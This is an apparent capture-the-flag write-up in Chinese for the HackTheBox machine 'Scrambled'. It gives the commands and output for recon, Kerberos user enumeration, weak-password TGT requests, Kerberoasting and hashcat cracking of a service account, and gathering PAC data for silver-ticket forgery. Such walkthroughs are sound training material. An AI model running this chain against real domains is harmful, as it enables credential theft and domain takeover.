---
title: HTB-Scrambled Writeup
date: 2026-09-10T14:00:00+08:00
draft: false
toc: true
images:
tags:
  - Hack
  - TGT
  - 反序列化
---
## Nmap 探测

使用 Nmap 探测存活的端口。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Scrambled]
└─$ sudo nmap --min-rate 10000 -p- 10.129.33.76 -oA Nmap/ports
[sudo] password for kali:
Starting Nmap 7.98 ( https://nmap.org ) at 2026-08-31 21:55 -0400
Nmap scan report for 10.129.33.76
Host is up (0.12s latency).
Not shown: 65514 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
1433/tcp  open  ms-sql-s
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
4411/tcp  open  found
5985/tcp  open  wsman
9389/tcp  open  adws
49667/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49701/tcp open  unknown
49709/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 21.39 seconds
┌──(kali㉿kali)-[~/Work/Kali/Scrambled]
└─$ grep open Nmap/ports.nmap | awk -F '/' '{print $1}' | paste -sd ','
53,80,88,135,139,389,445,464,593,636,1433,3268,3269,4411,5985,9389,49667,49673,49674,49701,49709

```

对存活的端口进行详细信息扫描,，1 个开放端口，其中 53 / 88 / 389 / 445 / 1433 / 3268 这套组合基本可以断定是台域控。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Scrambled]
└─$ sudo nmap -sT -sC -sV -O -p 53,80,88,135,139,389,445,464,593,636,1433,3268,3269,4411,5985,9389,49667,49673,49674,49701,49709 10.129.33.76 -oA Nmap/detail
Starting Nmap 7.98 ( https://nmap.org ) at 2026-08-31 21:59 -0400
Nmap scan report for 10.129.33.76
Host is up (0.11s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: Scramble Corp Intranet
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-09-01 01:59:10Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: scrm.local, Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC1.scrm.local
| Not valid before: 2024-09-04T11:14:45
|_Not valid after:  2121-06-08T22:39:53
|_ssl-date: 2026-09-01T02:02:24+00:00; -41s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: scrm.local, Site: Default-First-Site-Name)
|_ssl-date: 2026-09-01T02:02:24+00:00; -41s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC1.scrm.local
| Not valid before: 2024-09-04T11:14:45
|_Not valid after:  2121-06-08T22:39:53
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-info:
|   10.129.33.76:1433:
|     Version:
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-09-01T01:51:58
|_Not valid after:  2056-09-01T01:51:58
|_ssl-date: 2026-09-01T02:02:24+00:00; -41s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: scrm.local, Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC1.scrm.local
| Not valid before: 2024-09-04T11:14:45
|_Not valid after:  2121-06-08T22:39:53
|_ssl-date: 2026-09-01T02:02:24+00:00; -41s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: scrm.local, Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC1.scrm.local
| Not valid before: 2024-09-04T11:14:45
|_Not valid after:  2121-06-08T22:39:53
|_ssl-date: 2026-09-01T02:02:24+00:00; -41s from scanner time.
4411/tcp  open  found?
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, NCP, NULL, NotesRPC, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns:
|     SCRAMBLECORP_ORDERS_V1.0.3;
|   FourOhFourRequest, GetRequest, HTTPOptions, Help, LPDString, RTSPRequest, SIPOptions:
|     SCRAMBLECORP_ORDERS_V1.0.3;
|_    ERROR_UNKNOWN_COMMAND;
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49701/tcp open  msrpc         Microsoft Windows RPC
49709/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port4411-TCP:V=7.98%I=7%D=8/31%Time=6A963197%P=x86_64-pc-linux-gnu%r(NU
SF:LL,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(GenericLines,1D,"SCRAMBLEC
SF:ORP_ORDERS_V1\.0\.3;\r\n")%r(GetRequest,35,"SCRAMBLECORP_ORDERS_V1\.0\.
SF:3;\r\nERROR_UNKNOWN_COMMAND;\r\n")%r(HTTPOptions,35,"SCRAMBLECORP_ORDER
SF:S_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND;\r\n")%r(RTSPRequest,35,"SCRAMBLEC
SF:ORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND;\r\n")%r(RPCCheck,1D,"SCR
SF:AMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(DNSVersionBindReqTCP,1D,"SCRAMBLECOR
SF:P_ORDERS_V1\.0\.3;\r\n")%r(DNSStatusRequestTCP,1D,"SCRAMBLECORP_ORDERS_
SF:V1\.0\.3;\r\n")%r(Help,35,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNO
SF:WN_COMMAND;\r\n")%r(SSLSessionReq,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n
SF:")%r(TerminalServerCookie,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(TLS
SF:SessionReq,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(Kerberos,1D,"SCRAM
SF:BLECORP_ORDERS_V1\.0\.3;\r\n")%r(SMBProgNeg,1D,"SCRAMBLECORP_ORDERS_V1\
SF:.0\.3;\r\n")%r(X11Probe,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(FourO
SF:hFourRequest,35,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND
SF:;\r\n")%r(LPDString,35,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_
SF:COMMAND;\r\n")%r(LDAPSearchReq,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%
SF:r(LDAPBindReq,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(SIPOptions,35,"
SF:SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND;\r\n")%r(LANDesk
SF:-RC,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(TerminalServer,1D,"SCRAMB
SF:LECORP_ORDERS_V1\.0\.3;\r\n")%r(NCP,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r
SF:\n")%r(NotesRPC,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(JavaRMI,1D,"S
SF:CRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(WMSRequest,1D,"SCRAMBLECORP_ORDERS
SF:_V1\.0\.3;\r\n")%r(oracle-tns,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r
SF:(ms-sql-s,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(afp,1D,"SCRAMBLECOR
SF:P_ORDERS_V1\.0\.3;\r\n")%r(giop,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
Service Info: Host: DC1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2026-09-01T02:01:46
|_  start_date: N/A
|_clock-skew: mean: -41s, deviation: 0s, median: -41s

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 203.38 seconds
```

将暴露出来的域名做 hosts 解析。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Scrambled]
└─$ sudo bash -c 'echo "10.129.33.76 scrm.local" >> /etc/hosts'
┌──(kali㉿kali)-[~/Work/Kali/Scrambled]
└─$ tail -n 1 /etc/hosts
10.129.33.76 scrm.local DC1.scrm.local
```

## Web-80 渗透

访问 Web-80 端口，暴露出一个邮箱，保存下来做备用。

![](Pasted%20image%2020260901101047.png)

```bash
┌──(kali㉿kali)-[~/Work/Kali/Scrambled]
└─$ vim Users/emails
┌──(kali㉿kali)-[~/Work/Kali/Scrambled]
└─$ cat Users/emails
support@scramblecorp.com
```

继续浏览，发现一个配置文件，记录下来。

![](Pasted%20image%2020260901101336.png)

发现一段说明，自助密码重置还没上线，打电话重置时只要留言报上用户名，IT 就会把密码重置成**和用户名一样**。也就是说，只要枚举出一个有效用户名，就有很大概率拿到 `用户名:用户名` 的弱口令。

```bash
Password Resets

Our self service password reset system will be up and running soon but in the meantime please call the IT support line and we will reset your password. If no one is available please leave a message stating your username and we will reset your password to be the same as the username. 
```

找到一个用户名，保存下来。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Scrambled]
└─$ cat Users/users
ksimpson
```

## TGT 探索

kerbrute 走 88 端口做用户名枚举，`ksimpson@scrm.local` 确认有效。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Scrambled]
└─$ ./kerbrute_linux_amd64 userenum -d scrm.local --dc DC1.scrm.local Users/users

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: dev (9cfb81e) - 08/31/26 - Ronnie Flathers @ropnop

2026/08/31 22:37:01 >  Using KDC(s):
2026/08/31 22:37:01 >  	DC1.scrm.local:88

2026/08/31 22:37:01 >  [+] VALID USERNAME:	 ksimpson@scrm.local
2026/08/31 22:37:01 >  Done! Tested 1 usernames (1 valid) in 0.107 seconds
```

既然密码重置提示"密码=用户名"，直接拿 `ksimpson:ksimpson` 申请 TGT —— 一次成功，弱口令真实存在。

顺手检查 AS-REP Roasting：ksimpson 没开 `UF_DONT_REQUIRE_PREAUTH`，这条路不通，但 TGT 已经到手。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Scrambled]
└─$ impacket-getTGT scrm.local/ksimpson:ksimpson -dc-ip 10.129.33.76
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in ksimpson.ccache
┌──(kali㉿kali)-[~/Work/Kali/Scrambled]
└─$ impacket-GetNPUsers -no-pass scrm.local/ksimpson -dc-ip 10.129.33.76
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Getting TGT for ksimpson
[-] User ksimpson doesn't have UF_DONT_REQUIRE_PREAUTH set
```

把票据导进环境变量，后面所有 `-k`（Kerberos-only）认证都靠它。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Scrambled]
└─$ export KRB5CCNAME=$(pwd)/ksimpson.ccache
┌──(kali㉿kali)-[~/Work/Kali/Scrambled]
└─$ klist
Ticket cache: FILE:/home/kali/Work/Kali/Scrambled/ksimpson.ccache
Default principal: ksimpson@SCRM.LOCAL

Valid starting       Expires              Service principal
08/31/2026 22:39:30  09/01/2026 08:39:30  krbtgt/SCRM.LOCAL@SCRM.LOCAL
	renew until 09/01/2026 22:40:11
```

以 ksimpson 的身份用 Kerberos 列共享。`IT` / `Sales` / `HR` 全部 ACCESS_DENIED，只有 `Public` 能读，里面有一份 PDF `Network Security Changes.pdf`。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Scrambled]
└─$ impacket-smbclient -k -no-pass SCRM.LOCAL/ksimpson@DC1.scrm.local
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

Type help for list of commands
# shares
ADMIN$
C$
HR
IPC$
IT
NETLOGON
Public
Sales
SYSVOL
# use IT
ls
[-] SMB SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.
# ls
[-] SMB SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.
# use Sales
[-] SMB SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.
# use HR
[-] SMB SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.
# use Public
# ls
drw-rw-rw-          0  Thu Nov  4 18:23:19 2021 .
drw-rw-rw-          0  Thu Nov  4 18:23:19 2021 ..
-rw-rw-rw-     630106  Fri Nov  5 13:45:07 2021 Network Security Changes.pdf
# get Network Security Changes.pdf
# Traceback (most recent call last):
```

下载下来。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Scrambled]
└─$ ls -liah Network\ Security\ Changes.pdf
2793088 -rw-rw-r-- 1 kali kali 616K Aug 31 22:54 'Network Security Changes.pdf'
┌──(kali㉿kali)-[~/Work/Kali/Scrambled]
└─$ file Network\ Security\ Changes.pdf
Network Security Changes.pdf: PDF document, version 1.5, 1 page(s) (zip deflate encoded)
```

- **NTLM 全网禁用**，所有人改用 Kerberos —— 所以这一局所有工具都得带 `-k` 走 Kerberos-only 认证，relay 路线彻底封死；
- **SQL 服务只留给管理员**，HR 软件连不上库了 —— 反过来说，公告自己承认"攻击者当年就是从 HR 软件的 SQL 库里拿到的凭据"，谁要是能进 SQL，就能捡到别人留下的凭据。

```bash
Scramble Corp
ADDITIONAL SECURITY MEASURES
Date: 04/09/2021
FAO: All employees
Author: IT Support
As you may have heard, our network was recently compromised and an attacker was able to access
all of our data. We have identified the way the attacker was able to gain access and have made some
immediate changes. You can find these listed below along with the ways these changes may impact
you.
Change: As the attacker used something known as "NTLM relaying", we have disabled NTLM
authentication across the entire network.
Users impacted: All
Workaround: When you log on or access network resources you will now be using Kerberos
authentication (which is definitely 100% secure and has absolutely no way anyone could exploit it).
This will require you to use the full domain name (scrm.local) with your username and any server
names you access.
Change: The attacker was able to retrieve credentials from an SQL database used by our HR software
so we have removed all access to the SQL service for everyone apart from network administrators.
Users impacted: HR department
Workaround: If you can no longer access the HR software please contact us and we will manually
grant your account access again.
```

因为 NTLM 被禁，`-k` 走 Kerberos、`-dc-host` 直接指定 KDC，`-request` 把 TGS 一起拉回来。域里只有一个服务账号 `sqlsvc`，挂着两条 `MSSQLSvc` 的 SPN，返回的是 `$krb5tgs$23$` 开头的 RC4 hash，正是 hashcat 爱吃的格式。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Scrambled]
└─$ impacket-GetUserSPNs -k -no-pass -dc-host DC1.scrm.local SCRM.LOCAL/ksimpson -request
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

ServicePrincipalName          Name    MemberOf  PasswordLastSet             LastLogon                   Delegation
----------------------------  ------  --------  --------------------------  --------------------------  ----------
MSSQLSvc/dc1.scrm.local:1433  sqlsvc            2021-11-03 12:32:02.351452  2026-08-31 21:51:57.170530
MSSQLSvc/dc1.scrm.local       sqlsvc            2021-11-03 12:32:02.351452  2026-08-31 21:51:57.170530



$krb5tgs$23$*sqlsvc$SCRM.LOCAL$SCRM.LOCAL/sqlsvc*$8a4d97242530b754ec14f9e4cfe8e699$237cc207ded7c73b131c94a4ab2e6c87b09a093915c9754d9fc6e4f2c96a607b4a82168cff47aa7d0a557ac17a07a3f5986389d27dd7874bacd8ff39155b6e97e2845a9aa05779e3c9c20fe4bc7f901f4fe1fd6fd23da6a3c45c2bb6f4de3b909cf71e3ae7b4118e1f9238b2332fefda53a659fe1a7cab75ef2f619dfad9ed2eee76f2e77d992938601da88bf8f75caa4ed9437f5f1f5ac96439038490b4c5a1cac3980dcfd63a90a88f1990295ec7c2ee7468d86b72c36286c84c005a748eccf7ede8ed81011963a06217edae1dbb9c06fa04a091cd820d4eabfc9b98a9750777ab21624f9926a4eb63bc3fed0959a269c5c16eee3c1b5e55aa5da28d978af8337598124d6c2d54fb80fecba119c0c23c73598a1e6c7dc3231706253adefd980309494d7e2e633afd7702dc71e6d0806fcee769389f1f8abcc9c647bc261ef8656edcfe2d61df0f23a7434cc1da5fd352725863cb33c4397c727eda416778f856937ea87bdb42139e240260957f78d61cbb5dbe1bf1f6d09104156b0593674a242161d1797218ca19af7ee7fb60b1738e978b99f9feb4da1f71e2dd639b5bd5ef6172bbe6b5083a33215809fe7ad89d13e17bb8f202c22ebf6de15bccb7e80ada13ba508e601953b4572117f876b9a55852b161f7a4865a181a7dfb33cc6c8e999b1e1051481668e4e941fe06fdc58b38cf227e4d813dbd3004da68cae988802517033cdd96f80af857da8eb2f9933e1e16acbd5e045961511e3f81d66f27551366d9584362ac0976c0b82d917059347398701b7a00f2c398b39fec5fa109e92f4d29e8536b27cfb7ade9746118c3dcf6a9be654f87b74dcfb505a36eb05a7f6f521f61c94a44911760ffdbd00adde489fd43477dde31bf09021d2e429a2c2433ff5c514aeddea5774546beda54007d9757de6dcfd424576924cf406caa0ccb93382d671a06acfd07090b1e6064e1329f15754468a796cf0de781bf742795ac728d15c32ff1e16fc0ba274cc913e2ab1d9d8e8430a58e65d6dbdfdf84d33720b332c9f8f375e2aa48f3725f289e646964b6bc0ebe3468a2f151879c52160c4cd6fe6f83ec5da81972daf42e41f4e2acc4059fee3a8e9f0d02512667200bb9a4bc2a8e5001915b9fc6883caa482c309e1d71fe1b395aa0c5a7b5fcd14848c476897f43ee2416614afcc892832cd1946644a5936ba079565e31195792507ff679cb035fdb860198d9df76fd02d37a5d98a5dd3bf27bd863d7100dc6c08940dd4a84729b797afb915feee158c90a7cc2759b6f023ffcce34213416aa31905b6eb45afa947cd8a836fc4eee419d487e211264501b3337879c0062f823a31c28be7ad2ad286a966ee16895e494e38ea5b79cc3509265e7f3be8c97ff12b47a8d2c1038125b2933103ab0e21b68fbc642de2ba64e1a0795d9258cdee0c5
```

破解得到凭据 **sqlsvc : Pegasus60**。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Scrambled]
└─$ sudo hashcat -m 13100 Users/sqlsvc_hash /usr/share/wordlists/rockyou.txt
[sudo] password for kali:
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-haswell-13th Gen Intel(R) Core(TM) i9-13900HX, 13929/27859 MB (4096 MB allocatable), 8MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 514 MB (27328 MB free)

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$krb5tgs$23$*sqlsvc$SCRM.LOCAL$SCRM.LOCAL/sqlsvc*$8a4d97242530b754ec14f9e4cfe8e699$237cc207ded7c73b131c94a4ab2e6c87b09a093915c9754d9fc6e4f2c96a607b4a82168cff47aa7d0a557ac17a07a3f5986389d27dd7874bacd8ff39155b6e97e2845a9aa05779e3c9c20fe4bc7f901f4fe1fd6fd23da6a3c45c2bb6f4de3b909cf71e3ae7b4118e1f9238b2332fefda53a659fe1a7cab75ef2f619dfad9ed2eee76f2e77d992938601da88bf8f75caa4ed9437f5f1f5ac96439038490b4c5a1cac3980dcfd63a90a88f1990295ec7c2ee7468d86b72c36286c84c005a748eccf7ede8ed81011963a06217edae1dbb9c06fa04a091cd820d4eabfc9b98a9750777ab21624f9926a4eb63bc3fed0959a269c5c16eee3c1b5e55aa5da28d978af8337598124d6c2d54fb80fecba119c0c23c73598a1e6c7dc3231706253adefd980309494d7e2e633afd7702dc71e6d0806fcee769389f1f8abcc9c647bc261ef8656edcfe2d61df0f23a7434cc1da5fd352725863cb33c4397c727eda416778f856937ea87bdb42139e240260957f78d61cbb5dbe1bf1f6d09104156b0593674a242161d1797218ca19af7ee7fb60b1738e978b99f9feb4da1f71e2dd639b5bd5ef6172bbe6b5083a33215809fe7ad89d13e17bb8f202c22ebf6de15bccb7e80ada13ba508e601953b4572117f876b9a55852b161f7a4865a181a7dfb33cc6c8e999b1e1051481668e4e941fe06fdc58b38cf227e4d813dbd3004da68cae988802517033cdd96f80af857da8eb2f9933e1e16acbd5e045961511e3f81d66f27551366d9584362ac0976c0b82d917059347398701b7a00f2c398b39fec5fa109e92f4d29e8536b27cfb7ade9746118c3dcf6a9be654f87b74dcfb505a36eb05a7f6f521f61c94a44911760ffdbd00adde489fd43477dde31bf09021d2e429a2c2433ff5c514aeddea5774546beda54007d9757de6dcfd424576924cf406caa0ccb93382d671a06acfd07090b1e6064e1329f15754468a796cf0de781bf742795ac728d15c32ff1e16fc0ba274cc913e2ab1d9d8e8430a58e65d6dbdfdf84d33720b332c9f8f375e2aa48f3725f289e646964b6bc0ebe3468a2f151879c52160c4cd6fe6f83ec5da81972daf42e41f4e2acc4059fee3a8e9f0d02512667200bb9a4bc2a8e5001915b9fc6883caa482c309e1d71fe1b395aa0c5a7b5fcd14848c476897f43ee2416614afcc892832cd1946644a5936ba079565e31195792507ff679cb035fdb860198d9df76fd02d37a5d98a5dd3bf27bd863d7100dc6c08940dd4a84729b797afb915feee158c90a7cc2759b6f023ffcce34213416aa31905b6eb45afa947cd8a836fc4eee419d487e211264501b3337879c0062f823a31c28be7ad2ad286a966ee16895e494e38ea5b79cc3509265e7f3be8c97ff12b47a8d2c1038125b2933103ab0e21b68fbc642de2ba64e1a0795d9258cdee0c5:Pegasus60

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*sqlsvc$SCRM.LOCAL$SCRM.LOCAL/sqlsvc*$8...dee0c5
Time.Started.....: Mon Aug 31 23:04:19 2026 (3 secs)
Time.Estimated...: Mon Aug 31 23:04:22 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  3180.3 kH/s (1.48ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 10731520/14344385 (74.81%)
Rejected.........: 0/10731520 (0.00%)
Restore.Point....: 10723328/14344385 (74.76%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: Pkan123 -> Pastillez
Hardware.Mon.#01.: Util: 60%

Started: Mon Aug 31 23:04:17 2026
Stopped: Mon Aug 31 23:04:24 2026
```

将 Pegasus60 算成 NTLM hash（MD4），伪造银票要往 `-nthash` 里填。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Scrambled]
└─$ echo -n 'Pegasus60' | iconv -t UTF-16LE | openssl dgst -md4
MD4(stdin)= b999a16500b87d17ec7f2e2a68778f05
```

用 sqlsvc 的新凭据申请 TGT，正式接管这个服务账号的身份。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Scrambled]
└─$ export KRB5CCNAME=$(pwd)/sqlsvc.ccache
┌──(kali㉿kali)-[~/Work/Kali/Scrambled]
└─$ impacket-getTGT scrm.local/sqlsvc:Pegasus60 -dc-ip 10.129.33.76
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in sqlsvc.ccache
┌──(kali㉿kali)-[~/Work/Kali/Scrambled]
└─$ klist
Ticket cache: FILE:/home/kali/Work/Kali/Scrambled/sqlsvc.ccache
Default principal: sqlsvc@SCRM.LOCAL

Valid starting       Expires              Service principal
08/31/2026 23:18:57  09/01/2026 09:18:57  krbtgt/SCRM.LOCAL@SCRM.LOCAL
	renew until 09/01/2026 23:19:38
```

伪造银票前先收集信息。用 impacket 的 getPac 借 S4U2Self 拉回 administrator 的 PAC，里面有三样东西是必须的：

- Domain SID：`S-1-5-21-2743207045-1827831105-2542523200`；
- administrator 的 `UserId: 500`，内置管理员的固定 RID；
- 所属组 `512 / 513 / 518 / 519 / 520`（Domain Admins、Domain Users、Schema Admins、Enterprise Admins、Group Policy Creator Owners）。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Scrambled]
└─$ impacket-getPac -targetUser administrator scrm.local/sqlsvc:Pegasus60
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

KERB_VALIDATION_INFO
LogonTime:
    dwLowDateTime:                   1836325476
    dwHighDateTime:                  31275444
LogoffTime:
    dwLowDateTime:                   4294967295
    dwHighDateTime:                  2147483647
KickOffTime:
    dwLowDateTime:                   4294967295
    dwHighDateTime:                  2147483647
PasswordLastSet:
    dwLowDateTime:                   2585823167
    dwHighDateTime:                  30921784
PasswordCanChange:
    dwLowDateTime:                   3297396671
    dwHighDateTime:                  30921985
PasswordMustChange:
    dwLowDateTime:                   4294967295
    dwHighDateTime:                  2147483647
EffectiveName:                   'administrator'
FullName:                        ''
LogonScript:                     ''
ProfilePath:                     ''
HomeDirectory:                   ''
HomeDirectoryDrive:              ''
LogonCount:                      282
BadPasswordCount:                0
UserId:                          500
PrimaryGroupId:                  513
GroupCount:                      5
GroupIds:
    [

        RelativeId:                      513
        Attributes:                      7 ,

        RelativeId:                      512
        Attributes:                      7 ,

        RelativeId:                      520
        Attributes:                      7 ,

        RelativeId:                      518
        Attributes:                      7 ,

        RelativeId:                      519
        Attributes:                      7 ,
    ]
UserFlags:                       544
UserSessionKey:
    Data:                            b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
LogonServer:                     'DC1'
LogonDomainName:                 'SCRM'
LogonDomainId:
    Revision:                        1
    SubAuthorityCount:               4
    IdentifierAuthority:             b'\x00\x00\x00\x00\x00\x05'
    SubAuthority:
        [
             21,
             2743207045,
             1827831105,
             2542523200,
        ]
LMKey:                           b'\x00\x00\x00\x00\x00\x00\x00\x00'
UserAccountControl:              16912
SubAuthStatus:                   0
LastSuccessfulILogon:
    dwLowDateTime:                   0
    dwHighDateTime:                  0
LastFailedILogon:
    dwLowDateTime:                   0
    dwHighDateTime:                  0
FailedILogonCount:               0
Reserved3:                       0
SidCount:                        1
ExtraSids:
    [

        Sid:
            Revision:                        1
            SubAuthorityCount:               1
            IdentifierAuthority:             b'\x00\x00\x00\x00\x00\x12'
            SubAuthority:
                [
                     2,
                ]
        Attributes:                      7 ,
    ]
ResourceGroupDomainSid:
    Revision:                        1
    SubAuthorityCount:               4
    IdentifierAuthority:             b'\x00\x00\x00\x00\x00\x05'
    SubAuthority:
        [
             21,
             2743207045,
             1827831105,
             2542523200,
        ]
ResourceGroupCount:              1
ResourceGroupIds:
    [

        RelativeId:                      572
        Attributes:                      536870919 ,
    ]
Domain SID: S-1-5-21-2743207045-1827831105-2542523200

 0000   10 00 00 00 75 B3 83 01  05 41 B4 90 8E 80 C8 F5   ....u....A......
```

